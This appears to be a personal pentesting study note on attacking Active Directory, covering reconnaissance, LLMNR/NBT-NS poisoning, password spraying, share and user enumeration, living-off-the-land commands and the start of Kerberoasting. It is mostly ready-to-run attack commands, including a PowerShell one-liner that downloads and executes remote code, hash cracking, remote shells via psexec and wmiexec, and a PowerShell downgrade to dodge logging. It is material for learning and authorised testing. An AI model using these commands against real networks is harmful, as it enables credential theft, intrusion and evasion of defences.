---
title: Notes | AD Enumeration & Attack
author: Zeropio
date: 2022-08-15
categories: [Notes, System]
tags: [windows, ad]
permalink: /notes/system/ad-enum-attack
---

# Initial Enumeration

## Passive Enumeration

The first thing we should do is a external reconnaissance of the target. We should search for:
- **IP Space**
- **Domain Information**
- **Schema Format**
- **Data Disclosures**
- **Breach Data**

The table below lists a few potential resources and examples that can be used:

| **Target**   | **Resource**    |
|--------------- | --------------- |
| **ASN / IP registrars** | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/) |
| **Domain registrars & DNS** | [Domaintools](https://www.domaintools.com/), [ViewDNS](https://viewdns.info), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/en), manual DNS record |
| **Social Media** | Linkedin, Twitter, Facebook,... |
| **Public-Facing Company Websites** | public website for a corporation will have relevant info embedded |
| **Cloud & Dev Storage Spaces** | [GitHub](https://github.com/ ), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Dorks](https://www.exploit-db.com/google-hacking-database) |
| **Breach Data Sources** | [haveibeenpwned](https://haveibeenpwned.com/), [DeHashed](https://www.dehashed.com/),... |

With **BPG-Toolkit** we can just search a domain or IP address and the web will search any results. Take in mind that smaller enterprise which host their webs in another infrastructure are out of scope. Tools like [linkedin2username](https://github.com/initstring/linkedin2username) can help us creating userlists.

## Active Enumeration

When enumerating for a AD, we should look for:

| **Data**   | **Description**    |
|--------------- | --------------- |
| **AD Users** | valid user accounts we can target for password spraying |
| **AD Joined Computers** | Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers,... |
| **Key Services** | Kerberos, NetBIOS, LDAP, DNS |
| **Vulnerable Hosts and Services** | easy host to exploit and gain a foothold |

First, let's take some time to listen to the network and see what's going on. We can use **Wireshark**. If we are on a host without a GUI, we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](http://www.netminer.com/main/main-read.do), ...
```console
zero@pio$ sudo tcpdump -i <INTERFACE>
```

We can even use Responder:
```console
zero@pio$ sudo responder -I <INTERFACE> -A
```

Our passive checks have given us a few hosts to note down for a more in-depth enumeration. After this passive enumeration we can start and active enumeration with [fping](https://fping.org/). 
```console
zero@pio$ fping -asgq 172.16.5.0/23
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-a` | show targets that are alive |
| `-s` | print stats at the end |
| `-g` | generate a target list from the CIDR network |
| `-q` | show per-target results |

In the Nmap output we can see the **Domain Controller**. We can use Nmap for a wide scan:
```console
zero@pio$ sudo nmap -v -A -iL hosts.txt -oN discover_targets
```

Let's now enumerate users. We can use the [Kerbrute](https://github.com/ropnop/kerbrute) tool for a stealthier enumeration. We will use it with the list of [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames0), **jsmith.txt** pr **jsmith2.txt**. We can download the binary from [here](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) or make it:
```console
zero@pio$ sudo git clone https://github.com/ropnop/kerbrute.git
zero@pio$ make help; sudo make all
```

The newly created `dist`{: .filepath} directory will contain our compiled binaries. We can test it now:
```console
zero@pio$ ./kerbrute_linux_amd64 
```

If we want we can add it as a command:
```console
zero@pio$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

Now we can use it as a command:
```console
zero@pio$ kerbrute userenum -d <DOMAIN> --dc <DC IP> <USERLIST> -o <OUTPUT FILE>
```

---

# LLMNR/NBT-NS Poisoning

## Linux 

**Link-Local Multicast Name Resolution** (**LLMNR**) and **NetBIOS Name Service** (**NBT-NS**) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. LLMNR use the **port UDP 5355**. NBT-NS utilizes **port 137 over UDP**. LLMNR/NBT-NS are used for name resolution, any host on the network can reply. We **Responder** we can posion these requests. The effort is making the victim communicating with our system. If the requested host requieres name resolution or authentication actions, we can capture the NetNTLM. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. Combined with the lack of SMB signing can lead to administrative access.

The attack flow:
1. A host attempts to connect to the print server at **\\print01.<DOMAIN>**, but accidentally types in **\\printer01.<DOMAIN>**.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of **\\printer01.<DOMAIN>**.
4. The attacker (Responder) responds to the host stating that it is the **\\printer01.<DOMAIN>** that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. The hash can be cracked offline.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:
- [Responder](https://github.com/lgandx/Responder)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
- [Metasploit](https://www.metasploit.com/)

Both tools (Responder and Inveigh) can be used to attack the following protocols:
- LLMNR
- DNS
- MDNS
- NBNS
- DHCP
- ICMP
- HTTP
- HTTPS
- SMB
- LDAP
- WebDAV
- Proxy Auth

Responder also has support for:
- MSSQL
- DCE-RPC
- FTP, POP3, IMAP, and SMTP auth

Responder is a relatively straightforward tool. Now we will use Responder in a active way. Some common flags we will use are:

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-A` | make Responder analyze mode, seeing NBT-NS, BROWSER, and LLMNR without poisoning |
| `-w` | built-in WPAD proxy server |
| `-wf` | WPAD rogue proxy server |
| `-f` | fingerprint remote host OS and version |
| `-v` | will increased the verbosity |
| `-F` or `-P` | force NTLM or Basic authentication and force proxy authentication (may cause login prompt) |

We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best:
```
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

If Responder successfully captured hashes, as seen above, we can find the hashes associated with each host/protocol in their own text file. We can start a Responder session:
```console
zero@pio$ sudo responder -I <INTERFACE>
```

We can use `hashcat` to crack with the option 5600:
```console
zero@pio$ hashcat -m 5600 <HASH FILE> <WORDLIST>
```

## From Windows 

LLMNR & NBT-NS poisoning is possible from a Windows host as well. Let's do with the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh). It is written in C# and PowerShell. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that list all aviable parameters. Let's import the tool:
```console
PS C:\zeropio> Import-Module .\Inveigh.ps1
ps C:\zeropio> (Get-Command Invoke-Inveigh).Parameters
```

A LLMNR and NBNS spoofing:
```console
PS C:\zeropio> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

The PowerShell version of Inveigh is the original version and is no longer updated. The author maintains the C# version of it. We can run it as:
```console
PS C:\zeropio> \Inveigh.exe
```

The tool start showing us the options enabled and disabled. The option `[+]` are enabled by default, the options `[ ]` are disabled by default. We can hit the `esc` key to enter the console while Inveigh is running:
```console
...
C(0:0) NTLMv1(0:0) NTLMv2(3:9)>
```

After typing `HELP` we can see many options. We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`. We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.

---

# Password Spraying

Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. Beware of password spraying, because it can be harmful to the organization. In real life environments add delays between some tries.

## Password Policy

First we need the password policy. We can get it in several ways, like [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient`:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --pass-pol
```

This will tell us the password policy from the domain. Without credentials we can get the password policy via **SMB NULL** or **LDAP anonymous bind**. SMB NULL sessions allow us to retrieve information without being authenticated. For enumeration we can use tools like **enum4linux**, **CrackMapExec**, **rpcclient**,...
```console
zero@pio$ rpcclient -U "" -N <IP>

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

The query `querydominfo` will give us info about the domain, while `getdompwinfo` will tell us the password policy. The tool **enum4linux** works similar:
```console
zero@pio$ enum4linux -P <IP>
```

We can use **enum4linux-ng**, which has additional features like exporting in a file:
```console
zero@pio$ enum4linux-ng -P <IP> -oA <OUTPUT FILE>
```

**LDAP anonymous binds** allow us to retrieve information about the domain. We can use tools like **windapsearch.py**, **ldapsearch**, **ad-ldapdomaindump.py**,... Let's see the password policy:
```console
zero@pio$ ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

From Windows we can use the binary `net.exe`. As some tools like PowerView, CrackMapExec, SharpMapExec, SharpView,...
```console
C:\zeropio> net accounts
```

With PowerView:
```console
PS C:\zeropio> import-module .\PowerView.ps1
PS C:\zeropio> Get-DomainPolicy
```

PowerView give us the same output as `net accounts`, but also reveal if the password complexity is enabled.

**We should avoid locking accounts. If the maximun tries are 5, try only 2-3 before stopping.**

## User List 

We can get a valid list of users;
- SMB NULL retrieving a complete list of domain users
- LDAP anonymous bind to pull down the domain user list
- **Kerbrute** to validate users from a wordlist, like [this](https://github.com/insidetrust/statistically-likely-usernames) or from a [tool](https://github.com/initstring/linkedin2username)
- With a LLMNR/NBT-NS poisoning using Responder

### SMB NULL 

We can use **enum4linux** with the flag `-U`:
```console
zero@pio$ enum4linux -U <IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

The `enumdomusers` from rpcclient:
```console
zero@pio$ rpcclient -U "" -N <IP> 
rpcclient $> enumdomusers
```

Or CrackMapExec with the flag `--users`. This will also show the **badpwdcount** (invalid login attempts), also the **baddpwdtime** (date and time of the last bad password attempt), so we can see how close we are from a **badpwdcount** reset.
```console
zero@pio$ crackmapexec smb <IP> --users
```

### LDAP Anonymous

We can use [windapsearch](https://github.com/ropnop/windapsearch) or [ldapsearch](https://linux.die.net/man/1/ldapsearch):
```console
zero@pio$ ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

**windapsearch** make it easy. Use the `-u` flag to provide a blank username and `-U` to retrieve the users:
```console
zero@pio$ ./windapsearch.py --dc-ip <IP> -u "" -U
```

### Kerbrute 

If we don't have access we can use **Kerbrute** to enumerate valid AD users. Kerberos Pre-Authentication is faster and stealthier than the others methods. This doesn't generate Windows events or logon failure. The tool send TGT to the domain controller, if the KDC responds with `PRINCIPAL UNKNOWN` the user is invalid. We can use the userlist [jsmith.txt](https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt). The wordlist [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) is a good source for Kerbrute.
```console
zero@pio$ kerbrute userenum -d <DOMAIN> --dc <IP> jsmith-txt
```

We will check over 48,000 usernames in 12 seconds. If *Kerberos event logging* is enabled in Group Policy, this will generate event ID 4768.

### Credentialed Enumeration

With credentials we can enumerate with any of the previous tools:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <VALID USER> -p <VALID PASSWORD> --users
```

## From Linux 

With a userlist, now we can start the password spraying. **rpcclient** can be useful for performing the attack from Linux. Take in mind that a valid login is not immediately response **Authority Name**
. We can filter out by grepping for **Authority**:
```bash
for u in $(cat <USERLIST>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
```

We can also use **Kerbrute**:
```console
zero@pio$ kerbrute passwordspray -d <DOMAIN> --dc <IP> <USERLIST> <PASSWORD>
```

With **CrackMapExec**, we must `grep +` to only show valid users:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USERLIST> -p <PASSWORD> | grep +
```

After getting a valid credentials, we can try it:
```console
zero@pio$ sudo crackmapexec smb <IP> -u <USER> -p <PASSWORD>
```

This is not only possible with domain user accounts. If we obtain administrative access and the password (NTLM or cleartext), is common to see password reuse of administrative accounts. CrackMapExec will help us with this attack. Take in mind that if we find a password like **$desktop%@admin123**, it is possible to exist the password **$server%@admin123**.

If we only has the NTLM hash for the local administrator, we can spray it across the subnet. The following command will try to login as local administrator. The `--local-auth` will log in one time in each machine (to not block administrative account for the domain):
```console
zero@pio$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <HASH> | grep +
```

## From Windows 

In Windows we can use the tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray). If the host is domain joined we can skip the flag `-UserList` and let the tool generate the list:
```console
PS C:\zeropio> Import-Module .\DomainPasswordSpray.ps1
PS C:\zeropio> Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile <OUTPUT FILE> -ErrorAction SilentlyContinue
```

Kerbrute can also be used.

---

# Enumerating Security Controls 

After gaining foothold we need to enumerate the domain further. 

### Windows Defender 

Windows Defender is a really powerfull firwall, which will block toools such as PowerView. To get an overview of it we can see in the PowerShell:
```console
PS C:\zeropio> Get-MpComputerStatus
```

Here we can also see if Windows Defender is on or off.

### AppLocker 

Is an application whitelist of approved software. Organizations often block PowerShell.exe, but forget about other PowerShell executables like `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`{: .filepath} or `PowerShell_ISE.exe`{: .filepath}. Sometimes AppLocker will have more restrictive policies. We can see the policies:
```console
PS C:\zeropio> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### PowerShell Constrained Language Mode 

**PowerShell Constrained Language Mode** block many features, such as COM objects, PowerShell classes, XAML-based workflows,... We can check if we are in a *Full Language Mode* or *Constrained Language Mode*:
```console
PS C:\zeropio> $ExecutionContext.SessionState.LanguageMode
```

### LAPS 

The **Microsoft Local Administrator Password Solution** (**LAPS**) randomize and rotate local administrator passwords, to prevent lateral movement. We can enumerate which machines has installed and which not. We can use the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) for it. 
```console
PS C:\zeropio> Find-LAPSDelegatedGroups 
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with *All Extended Rights*. Those users can read LAPS passwords, so you should check it:
```console
PS C:\zeropio> Find-AdmPwdExtendedRights
```

We can search computers with LAPS enabled when passwords expire (even the randomized passwords in cleartext if our user has access):
```console
PS C:\zeropio> Get-LAPSComputers
```

## From Linux 

### CrackMapExec

[CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) can be used here. After gaining credentials, we can use CrackMapExec to enumerate:

- Users 

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD>  
```

- Groups and membercount

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --groups
```

- Logged users

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --loggedon-users
```

- Shares

```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --shares
```

We can some shares with the property **READ**. The module **spider_plus** could help us dig in them:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -M spider_plus --share '<SHARED FOLDER>'
```

This will crete a JSON in `/tmp/cme_spider_plus/<IP>`{: .filepath} with the results.

### SMBMap 

SMBMap is a great choice for enumerating SMB shares from Linux. For example:
```console
zero@pio$ smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <IP>
```

Once we have seen the shares, we can select one:
```console
zero@pio$ smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <IP> -R '<SHARED FOLDER>' --dir-only
```

The flag `--dir-only` only ouput directories, not files.

### rpcclient 

As we have seen, we can exploit the SMB NULL sessions with it:
```console
zero@pio$ rpcclient -U "" -N <TARGET>

rpcclient $> 
```

While looking at users here we can see a `rid:` parameter. The **Relative Identifier** (**RID**) is a unique identifier for Windows objects. However, there are accounts that will have the same RID. The Administrator account will always be *RID [administrator] rid:[0x1f4]*, which equals **500**. That value is calculated from the name of the object. We can search it as:
```console
rpcclient $> query user 0x<HEX CODE>
```

Using `enumdomusers` will tell us the users' RID.

### Impacket Toolkit 

For this we will be using the [wmiexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/wmiexec.py) and [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py). **psexec.py** is one of the most useful tools from Impacket. Is a clone of the sysinternals psexec executable. It creates a remote service, uploading a randomly name executable to the **ADMIN$** share. It register the service via **RPC** and **Windows Service Control Manager**, giving a remote shell as SYSTEM. We need the credentials for the local administrator to do it.
```console
zero@pio$ psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

**wmiexec.py** utilizes a semi-interactive shell. Commands are executed through **Windows Management Instrumentation**. This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems.
```console
zero@pio$ wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
```

### Windapsearch 

[Windapsearch](https://github.com/ropnop/windapsearch) is another tool for enumerating using LDAP queries. For example:
```console
zero@pio$ python3  windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASSWORD> --da
zero@pio$ python3  windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASSWORD> -PU
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `--da` | enumerate domain admins group members |
| `-PU` | find privileged users |

### Bloodhound.py 

With domain credentials we can run [BloodHound.py](https://github.com/fox-it/BloodHound.py). This tool is one of the most helpful in AD pentesting. Initially was written for PowerShell, but this Python version allow us running from a Linux (it requires Impacket, ldap3 and dnspython). For example, a command to retrieve anythin:
```console
zero@pio$ sudo bloodhound-python -u '<USER>' -p '<PASSWORD>' -ns <IP> -d <DOMAIN> -c all
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-c`/`--collectionmethod <TPYE>` | set what we want to collect |

Once it is down it will create some files (**...computers.json**, **...domains.json**, **...groups.json** and **...users.json**). We could use now [neo4j](https://neo4j.com/). Start the service as `sudod neo4j start`. Start the GUI version of Bloodhound and upload the data. We can upload each JSON or the zip (`zip -r target.zip *.json`). 

Now go to the **Analysis** to run queries against the database. We can use built-in queries like **Path Finding**. **Find Shortest Paths To Domain Admins** query will create a map of the AD. 

## From Windows 

### ActiveDirectory PowerShell Module 

The [ActiveDirectory PowerShell Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) is a groupf of cmdlets for administering AD from the command line. First, make sure it is imported:
```console
PS C:\zeropio> Get-Module
PS C:\zeropio> Import-Module ActiveDirectory 
PS C:\zeropio> Get-Module 
```

First. we'll enumerate the domain:
```console
PS C:\zeropio> Get-ADDomain
```

This will print the domain SID, domain functional level, child domains, ... Next the users, filtering by **ServicePrincipalName**. This will get a list of accounts susceptible of Kerberoasting attack:
```console
PS C:\zeropio> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Verify domain trust relationships. We can determine if there are trusts within our forest or with domains in others forest, the type of trust, direction and name of the domain the relationship is with.
```console
PS C:\zeropio> Get-ADTrust -Filter *
```

Next get the AD group information:
```console
PS C:\zeropio> Get-ADGroup -Filter * | select name
```

We can use the name of a interesing group and check it:
```console
PS C:\zeropio> Get-ADGroup -Identity "Backup Operators"
```

To get a member list of a group:
```console
PS C:\zeropio> Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView 

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us. Similar to BloodHound, provides a bunch of information. This are some of the functionalities it has:

| **Command**   | **Description**    |
|--------------- | --------------- |
| `Export-PowerViewCSV` | append results to a CSV file |
| `ConvertTo-SID` | convert a user or group name to the SID value |
| `Get-DomainSPNTicket` | requests the Kerberos ticket for a specified SPN account |
| **Domain/LDAP Functions** |
| `Get-Domain` | return the AD object for the current (or specified) domain |
| `Get-DomainController` | Return a list of the Domain Controllers for the specified domain |
| `Get-DomainUser` | Will return all users or specific user objects in AD |
| `Get-DomainComputer` |	Will return all computers or specific computer objects in AD |
| `Get-DomainGroup` |	Will return all groups or specific group objects in AD |
| `Get-DomainOU` |	Search for all or specific OU objects in AD |
| `Find-InterestingDomainAcl` |	Finds object ACLs in the domain with modification rights set to non-built in objects |
| `Get-DomainGroupMember` |	Will return the members of a specific domain group |
| `Get-DomainFileServer` |	Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` |	Returns a list of all distributed file systems for the current (or specified) domain |
| **GPO Functions** |	
| `Get-DomainGPO` |	Will return all GPOs or specific GPO objects in AD |
| `Get-DomainPolicy` |	Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions** |
| `Get-NetLocalGroup` |	Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` |	Enumerates members of a specific local group |
| `Get-NetShare` |	Returns open shares on the local (or a remote) machine |
| `Get-NetSession` |	Will return session information for the local (or a remote) machine |
| `Test-AdminAccess` |	Tests if the current user has administrative access to the local (or a remote) machine |
| **Threaded 'Meta'-Functions** |
| `Find-DomainUserLocation` |	Finds machines where specific users are logged in |
| `Find-DomainShare` |	Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` |	Searches for files matching specific criteria on readable shares in the domain |
| `Find-LocalAdminAcces` |s	Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions** |
| `Get-DomainTrust` |	Returns domain trusts for the current domain or a specified domain |
| `Get-ForestTrust` |	Returns all forest trusts for the current forest or a specified forest |
| `Get-DomainForeignUser` |	Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` |	Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping	Will` | enumerate all trusts for the current domain and any others seen. |

To get domain information, using known credentials:
```console
PS C:\zeropio> Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

We can use now the following command to retrieve group-specific information:
```console
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

With the last output we can take an idea of target for elevation of privileges. Let's see now the domain trust:
```console
PS C:\zeropio> Get-DomainTrustMapping
```

We can test for local admin access on our machine or remote. We can use the same command on each host, to test if we have admin access.
```console
PS C:\zeropio> Test-AdminAccess -ComputerName <TARGET>
```

We can find users with SPN set:
```console
PS C:\zeropio> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

Currently, PowerView is deprecated. Empire 4 framework has been updating it since them [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1).

### SharpView 

Another tool worth to mention is SharpView, a .NET port of PowerView. PowerView can be used with SharpView. For example, enumerating a user:
```console
PS C:\zeropio> .\SharpView.exe Get-DomainUser -Identity <USER>
```
### Snaffler

[This](https://github.com/SnaffCon/Snaffler) tool help us acquiring credentials from AD environments. Snaffler obtains a list of hosts within the domain. enumerating those hosts for shares and readable directories. To execute Snaffler, we can use the command below:
```console
PS C:\zeropio> .\Snaffler.exe -s -d <DOMAIN> -o <LOG OUTPUT> -v data
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-s` | print the results in console |
| `-d` | select domain |
| `-o` | select logfile (ends by .log) | 
| `-v <type>` | verbosity |
| `data` | verbosity level, only displays results to the screen |

### BloodHound 

BloodHound is also aviable for Windows hosts. Executed as:
```console
PS C:\zeropio> .\SharpHound.exe --help
```

We can start the SharpHound.exe collector:
```console
PS C:\zeropio> .\SharpHound.exe -c All --zipfilename <TARGET>
```

We can send the data to our host or even in the BloodHound GUI from Windows, to use **neo4j**. Inside it, the query *Find Computers with Unsupported Operating Systems* is great for finding outdated and unsupported operating systems running legacy software.  We can run the query *Find Computers where Domain Users are Local Admin* to quickly see if there are any hosts where all users have local admin rights.

If we want to find the Kerberoastable accounts, inside the *Raw Query*:
```
MATCH (n:User)WHERE n.hasspn=true
RETURN n
```

## Living Off the Land 

This means to do all we can do it, without having access to internet or downloading our tools from our host. 

### CMD

First, we can do a basic enumeration commands: 

| **Command**   | **Description**    |
|--------------- | --------------- |
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` |	Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` |	Prints the patches and hotfixes applied to the host |
| `ipconfig /all` |	Prints out network adapter state and configurations |
| `set %USERDOMAIN%` |	Displays the domain name to which the host belongs (ran from CMD-prompt) |
| `set %logonserver%` |	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

We can also use the command `systeminfo` to get a overview of it.

### PowerShell

The Powershell can be a helpful tool also:

| **Cmd-let**   | **Description**    |
|--------------- | --------------- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` |	Will print the execution policy settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` |	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` |	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `Get-ChildItem Env: | ft Key,Value	Return environment values such as key paths, users, computer information, etc.
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` |	This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

### Downgrading PowerShell

Many defenders are unaware that several versions of PowerShell often exist on a host.  Below is an example of downgrading Powershell:
```console
PS C:\zeropio> Get-host
PS C:\zeropio> powershell.exe -version 2
PS C:\zeropio> Get-host
```

This can change the log output. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged.

### Checking Defenses 

With the commands `netsh` and `sc` we can check the defenses of the host. For example, checking the firewall:
```console
PS C:\zeropio> netsh advfirewall show allprofiles
```

Windows Defender from the CMD:
```console
C:\zeropio> sc query windefend
```

Status and configuration of the Windows Defender:
```console
PS C:\zeropio> Get-MpComputerStatus
```

### Am I Alone? 

Check other logged accounts:
```console
PS C:\zeropio> qwinsta
```

### Network Information

| **Command**   | **Description**    |
|--------------- | --------------- |
| `arp -a` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` |	Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` |	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` |	Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

`arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. 

### Windows Management Instrumentation (WMI) 

| **Command**   | **Description**    |
|--------------- | --------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` |	Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` |	A listing of all processes on host |
| `wmic ntdomain list /format:list` |	Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` |	Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` |	Information about all local groups |
| `wmic sysaccount list /format:list` |	Dumps information about any system accounts that are being used as service accounts. |

This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) could help us.

### Net Commands 

We can list information such as:
- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

Using the `net.exe` binary:

| **Command**   | **Description**    |
|--------------- | --------------- |
| `net accounts` | Information about password requirements |
| `net accounts /domain` |	Password and lockout policy |
| `net group /domain` |	Information about domain groups |
| `net group "Domain Admins" /domain` |	List users with domain admin privileges |
| `net group "domain computers" /domain` |	List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` |	List PC accounts of domains controllers |
| `net group <domain_group_name> /domai` |n	User that belongs to the group |
| `net groups /domain` |	List of domain groups |
| `net localgroup` |	All available groups |
| `net localgroup administrators /domain` |	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| `net localgroup Administrators` |	Information about a group (admins) |
| `net localgroup administrators [username] /add` |	Add user to administrators |
| `net share` |	Check current shares |
| `net user <ACCOUNT_NAME> /domain` |	Get information about a user within the domain |
| `net user /domain` |	List all users of the domain |
| `net user %username%` |	Information about the current user |
| `net use x: \computer\share` |	Mount the share locally |
| `net view` |	Get a list of computers |
| `net view /all /domain[:domainname]` |	Shares on the domains |
| `net view \computer /ALL` |	List shares of a computer |
| `net view /domain` |	List of PCs of the domain |

### Dsquery 

Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. This tool will exist on any host with the **Active Directory Domain Services Role** installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`{: .filepath}.

| **Command**   | **Description**    |
|--------------- | --------------- |
| `dsquery user` | User search |
| `dsquery computer` | Computer search |
| `dsquery * "CN=Users,DC=<DOMAIN>,DC=LOCAL"` | Wildcard search |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Users with specific attributes set (**PASSWD_NOTREQD**) |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` | Domain controllers search |

We are using queries like `userAccountControl:1.2.840.113556.1.4.803:=8192`. That are strings in LDAP queries (ca be used also with AD PowerShell, ldapsearch,...)
. 

![LDAP Query](/assets/img/notes/system/UAC-values.png)

---

# Kerberoasting 

**Kerberoasting** is a lateral movement in AD environments, targeting the Service Principal Names (**SPN**). This are unique id that Kerberos uses. Any domain user can request Kerberos ticket. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host. 

